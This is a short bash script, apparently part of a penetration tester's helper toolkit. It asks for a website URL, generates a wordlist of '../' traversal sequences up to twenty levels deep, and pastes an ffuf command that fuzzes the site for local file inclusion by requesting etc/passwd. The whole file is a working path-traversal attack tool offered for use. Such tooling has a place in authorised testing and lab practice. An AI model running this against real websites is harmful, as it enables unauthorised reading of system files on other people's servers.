#!/bin/bash

: '
fuzz for LFI root directory with custom wordlist
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website"

WEBSITE=${form_data["Website"]}
FILE="/tmp/directory_structure.txt"

# Create directory wordlist
seq 1 20 | awk '{for(i=1;i<=$1;i++)printf "../"; print ""}' > $FILE

paste_command "ffuf -w ${FILE}:FUZZ -u '${WEBSITE}FUZZetc/passwd'"
